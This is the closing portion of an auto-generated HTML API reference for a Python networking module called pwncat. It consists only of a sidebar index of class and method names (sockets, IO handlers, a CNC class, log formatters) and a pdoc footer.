<li><code><b><a title="pwncat.Transform" href="#pwncat.Transform">Transform</a></b></code>:
<ul class="hlist">
<li><code><a title="pwncat.Transform.log" href="#pwncat.Transform.log">log</a></code></li>
</ul>
</li>
</ul>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3><a href="#header-functions">Functions</a></h3>
<ul class="">
<li><code><a title="pwncat.get_args" href="#pwncat.get_args">get_args</a></code></li>
<li><code><a title="pwncat.get_version" href="#pwncat.get_version">get_version</a></code></li>
<li><code><a title="pwncat.main" href="#pwncat.main">main</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="pwncat.CNC" href="#pwncat.CNC">CNC</a></code></h4>
<ul class="">
<li><code><a title="pwncat.CNC.create_remote_tmpfile" href="#pwncat.CNC.create_remote_tmpfile">create_remote_tmpfile</a></code></li>
<li><code><a title="pwncat.CNC.print_info" href="#pwncat.CNC.print_info">print_info</a></code></li>
<li><code><a title="pwncat.CNC.py3" href="#pwncat.CNC.py3">py3</a></code></li>
<li><code><a title="pwncat.CNC.python" href="#pwncat.CNC.python">python</a></code></li>
<li><code><a title="pwncat.CNC.remote_command" href="#pwncat.CNC.remote_command">remote_command</a></code></li>
<li><code><a title="pwncat.CNC.upload" href="#pwncat.CNC.upload">upload</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.CNCAutoDeploy" href="#pwncat.CNCAutoDeploy">CNCAutoDeploy</a></code></h4>
</li>
<li>
<h4><code><a title="pwncat.ColoredLogFormatter" href="#pwncat.ColoredLogFormatter">ColoredLogFormatter</a></code></h4>
<ul class="">
<li><code><a title="pwncat.ColoredLogFormatter.COLORS" href="#pwncat.ColoredLogFormatter.COLORS">COLORS</a></code></li>
<li><code><a title="pwncat.ColoredLogFormatter.COLOR_DEF" href="#pwncat.ColoredLogFormatter.COLOR_DEF">COLOR_DEF</a></code></li>
<li><code><a title="pwncat.ColoredLogFormatter.COLOR_RST" href="#pwncat.ColoredLogFormatter.COLOR_RST">COLOR_RST</a></code></li>
<li><code><a title="pwncat.ColoredLogFormatter.format" href="#pwncat.ColoredLogFormatter.format">format</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.DsIOCommand" href="#pwncat.DsIOCommand">DsIOCommand</a></code></h4>
<ul class="">
<li><code><a title="pwncat.DsIOCommand.bufsize" href="#pwncat.DsIOCommand.bufsize">bufsize</a></code></li>
<li><code><a title="pwncat.DsIOCommand.enc" href="#pwncat.DsIOCommand.enc">enc</a></code></li>
<li><code><a title="pwncat.DsIOCommand.executable" href="#pwncat.DsIOCommand.executable">executable</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.DsIONetworkCli" href="#pwncat.DsIONetworkCli">DsIONetworkCli</a></code></h4>
<ul class="">
<li><code><a title="pwncat.DsIONetworkCli.reconn" href="#pwncat.DsIONetworkCli.reconn">reconn</a></code></li>
<li><code><a title="pwncat.DsIONetworkCli.reconn_robin" href="#pwncat.DsIONetworkCli.reconn_robin">reconn_robin</a></code></li>
<li><code><a title="pwncat.DsIONetworkCli.reconn_wait" href="#pwncat.DsIONetworkCli.reconn_wait">reconn_wait</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.DsIONetworkSock" href="#pwncat.DsIONetworkSock">DsIONetworkSock</a></code></h4>
<ul class="">
<li><code><a title="pwncat.DsIONetworkSock.recv_timeout_retry" href="#pwncat.DsIONetworkSock.recv_timeout_retry">recv_timeout_retry</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.DsIONetworkSrv" href="#pwncat.DsIONetworkSrv">DsIONetworkSrv</a></code></h4>
<ul class="">
<li><code><a title="pwncat.DsIONetworkSrv.keep_open" href="#pwncat.DsIONetworkSrv.keep_open">keep_open</a></code></li>
<li><code><a title="pwncat.DsIONetworkSrv.rebind" href="#pwncat.DsIONetworkSrv.rebind">rebind</a></code></li>
<li><code><a title="pwncat.DsIONetworkSrv.rebind_robin" href="#pwncat.DsIONetworkSrv.rebind_robin">rebind_robin</a></code></li>
<li><code><a title="pwncat.DsIONetworkSrv.rebind_wait" href="#pwncat.DsIONetworkSrv.rebind_wait">rebind_wait</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.DsIOStdinStdout" href="#pwncat.DsIOStdinStdout">DsIOStdinStdout</a></code></h4>
<ul class="">
<li><code><a title="pwncat.DsIOStdinStdout.enc" href="#pwncat.DsIOStdinStdout.enc">enc</a></code></li>
<li><code><a title="pwncat.DsIOStdinStdout.input_timeout" href="#pwncat.DsIOStdinStdout.input_timeout">input_timeout</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.DsRunnerAction" href="#pwncat.DsRunnerAction">DsRunnerAction</a></code></h4>
<ul class="">
<li><code><a title="pwncat.DsRunnerAction.code" href="#pwncat.DsRunnerAction.code">code</a></code></li>
<li><code><a title="pwncat.DsRunnerAction.consumer" href="#pwncat.DsRunnerAction.consumer">consumer</a></code></li>
<li><code><a title="pwncat.DsRunnerAction.interrupts" href="#pwncat.DsRunnerAction.interrupts">interrupts</a></code></li>
<li><code><a title="pwncat.DsRunnerAction.producer" href="#pwncat.DsRunnerAction.producer">producer</a></code></li>
<li><code><a title="pwncat.DsRunnerAction.transformers" href="#pwncat.DsRunnerAction.transformers">transformers</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.DsRunnerTimer" href="#pwncat.DsRunnerTimer">DsRunnerTimer</a></code></h4>
<ul class="">
<li><code><a title="pwncat.DsRunnerTimer.action" href="#pwncat.DsRunnerTimer.action">action</a></code></li>
<li><code><a title="pwncat.DsRunnerTimer.args" href="#pwncat.DsRunnerTimer.args">args</a></code></li>
<li><code><a title="pwncat.DsRunnerTimer.intvl" href="#pwncat.DsRunnerTimer.intvl">intvl</a></code></li>
<li><code><a title="pwncat.DsRunnerTimer.kwargs" href="#pwncat.DsRunnerTimer.kwargs">kwargs</a></code></li>
<li><code><a title="pwncat.DsRunnerTimer.signal" href="#pwncat.DsRunnerTimer.signal">signal</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.DsSock" href="#pwncat.DsSock">DsSock</a></code></h4>
<ul class="two-column">
<li><code><a title="pwncat.DsSock.backlog" href="#pwncat.DsSock.backlog">backlog</a></code></li>
<li><code><a title="pwncat.DsSock.bufsize" href="#pwncat.DsSock.bufsize">bufsize</a></code></li>
<li><code><a title="pwncat.DsSock.info" href="#pwncat.DsSock.info">info</a></code></li>
<li><code><a title="pwncat.DsSock.ip_tos" href="#pwncat.DsSock.ip_tos">ip_tos</a></code></li>
<li><code><a title="pwncat.DsSock.ipv6" href="#pwncat.DsSock.ipv6">ipv6</a></code></li>
<li><code><a title="pwncat.DsSock.nodns" href="#pwncat.DsSock.nodns">nodns</a></code></li>
<li><code><a title="pwncat.DsSock.recv_timeout" href="#pwncat.DsSock.recv_timeout">recv_timeout</a></code></li>
<li><code><a title="pwncat.DsSock.udp" href="#pwncat.DsSock.udp">udp</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.DsTransformLinefeed" href="#pwncat.DsTransformLinefeed">DsTransformLinefeed</a></code></h4>
<ul class="">
<li><code><a title="pwncat.DsTransformLinefeed.crlf" href="#pwncat.DsTransformLinefeed.crlf">crlf</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.IO" href="#pwncat.IO">IO</a></code></h4>
<ul class="">
<li><code><a title="pwncat.IO.consumer" href="#pwncat.IO.consumer">consumer</a></code></li>
<li><code><a title="pwncat.IO.interrupt" href="#pwncat.IO.interrupt">interrupt</a></code></li>
<li><code><a title="pwncat.IO.log" href="#pwncat.IO.log">log</a></code></li>
<li><code><a title="pwncat.IO.producer" href="#pwncat.IO.producer">producer</a></code></li>
<li><code><a title="pwncat.IO.ssig" href="#pwncat.IO.ssig">ssig</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.IOCommand" href="#pwncat.IOCommand">IOCommand</a></code></h4>
<ul class="">
<li><code><a title="pwncat.IOCommand.consumer" href="#pwncat.IOCommand.consumer">consumer</a></code></li>
<li><code><a title="pwncat.IOCommand.interrupt" href="#pwncat.IOCommand.interrupt">interrupt</a></code></li>
<li><code><a title="pwncat.IOCommand.producer" href="#pwncat.IOCommand.producer">producer</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.IONetwork" href="#pwncat.IONetwork">IONetwork</a></code></h4>
<ul class="">
<li><code><a title="pwncat.IONetwork.consumer" href="#pwncat.IONetwork.consumer">consumer</a></code></li>
<li><code><a title="pwncat.IONetwork.interrupt" href="#pwncat.IONetwork.interrupt">interrupt</a></code></li>
<li><code><a title="pwncat.IONetwork.producer" href="#pwncat.IONetwork.producer">producer</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.IOStdinStdout" href="#pwncat.IOStdinStdout">IOStdinStdout</a></code></h4>
<ul class="">
<li><code><a title="pwncat.IOStdinStdout.consumer" href="#pwncat.IOStdinStdout.consumer">consumer</a></code></li>
<li><code><a title="pwncat.IOStdinStdout.interrupt" href="#pwncat.IOStdinStdout.interrupt">interrupt</a></code></li>
<li><code><a title="pwncat.IOStdinStdout.producer" href="#pwncat.IOStdinStdout.producer">producer</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.PSEStore" href="#pwncat.PSEStore">PSEStore</a></code></h4>
<ul class="">
<li><code><a title="pwncat.PSEStore.log" href="#pwncat.PSEStore.log">log</a></code></li>
<li><code><a title="pwncat.PSEStore.messages" href="#pwncat.PSEStore.messages">messages</a></code></li>
<li><code><a title="pwncat.PSEStore.net" href="#pwncat.PSEStore.net">net</a></code></li>
<li><code><a title="pwncat.PSEStore.ssig" href="#pwncat.PSEStore.ssig">ssig</a></code></li>
<li><code><a title="pwncat.PSEStore.store" href="#pwncat.PSEStore.store">store</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.Runner" href="#pwncat.Runner">Runner</a></code></h4>
<ul class="">
<li><code><a title="pwncat.Runner.add_action" href="#pwncat.Runner.add_action">add_action</a></code></li>
<li><code><a title="pwncat.Runner.add_timer" href="#pwncat.Runner.add_timer">add_timer</a></code></li>
<li><code><a title="pwncat.Runner.run" href="#pwncat.Runner.run">run</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.Sock" href="#pwncat.Sock">Sock</a></code></h4>
<ul class="two-column">
<li><code><a title="pwncat.Sock.IP_TOS" href="#pwncat.Sock.IP_TOS">IP_TOS</a></code></li>
<li><code><a title="pwncat.Sock.close_bind_sock" href="#pwncat.Sock.close_bind_sock">close_bind_sock</a></code></li>
<li><code><a title="pwncat.Sock.close_conn_sock" href="#pwncat.Sock.close_conn_sock">close_conn_sock</a></code></li>
<li><code><a title="pwncat.Sock.gethostbyname" href="#pwncat.Sock.gethostbyname">gethostbyname</a></code></li>
<li><code><a title="pwncat.Sock.re_accept_client" href="#pwncat.Sock.re_accept_client">re_accept_client</a></code></li>
<li><code><a title="pwncat.Sock.receive" href="#pwncat.Sock.receive">receive</a></code></li>
<li><code><a title="pwncat.Sock.run_client" href="#pwncat.Sock.run_client">run_client</a></code></li>
<li><code><a title="pwncat.Sock.run_server" href="#pwncat.Sock.run_server">run_server</a></code></li>
<li><code><a title="pwncat.Sock.send" href="#pwncat.Sock.send">send</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.StopSignal" href="#pwncat.StopSignal">StopSignal</a></code></h4>
<ul class="">
<li><code><a title="pwncat.StopSignal.has_stop" href="#pwncat.StopSignal.has_stop">has_stop</a></code></li>
<li><code><a title="pwncat.StopSignal.raise_stop" href="#pwncat.StopSignal.raise_stop">raise_stop</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.StringEncoder" href="#pwncat.StringEncoder">StringEncoder</a></code></h4>
<ul class="">
<li><code><a title="pwncat.StringEncoder.base64_encode" href="#pwncat.StringEncoder.base64_encode">base64_encode</a></code></li>
<li><code><a title="pwncat.StringEncoder.decode" href="#pwncat.StringEncoder.decode">decode</a></code></li>
<li><code><a title="pwncat.StringEncoder.encode" href="#pwncat.StringEncoder.encode">encode</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.TraceLogger" href="#pwncat.TraceLogger">TraceLogger</a></code></h4>
<ul class="">
<li><code><a title="pwncat.TraceLogger.LEVEL_NAME" href="#pwncat.TraceLogger.LEVEL_NAME">LEVEL_NAME</a></code></li>
<li><code><a title="pwncat.TraceLogger.LEVEL_NUM" href="#pwncat.TraceLogger.LEVEL_NUM">LEVEL_NUM</a></code></li>
<li><code><a title="pwncat.TraceLogger.trace" href="#pwncat.TraceLogger.trace">trace</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.Transform" href="#pwncat.Transform">Transform</a></code></h4>
<ul class="">
<li><code><a title="pwncat.Transform.log" href="#pwncat.Transform.log">log</a></code></li>
<li><code><a title="pwncat.Transform.transform" href="#pwncat.Transform.transform">transform</a></code></li>
</ul>
</li>
<li>
<h4><code><a title="pwncat.TransformLinefeed" href="#pwncat.TransformLinefeed">TransformLinefeed</a></code></h4>
<ul class="">
<li><code><a title="pwncat.TransformLinefeed.transform" href="#pwncat.TransformLinefeed.transform">transform</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc"><cite>pdoc</cite> 0.8.1</a>.</p>
</footer>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad()</script>
</body>
</html>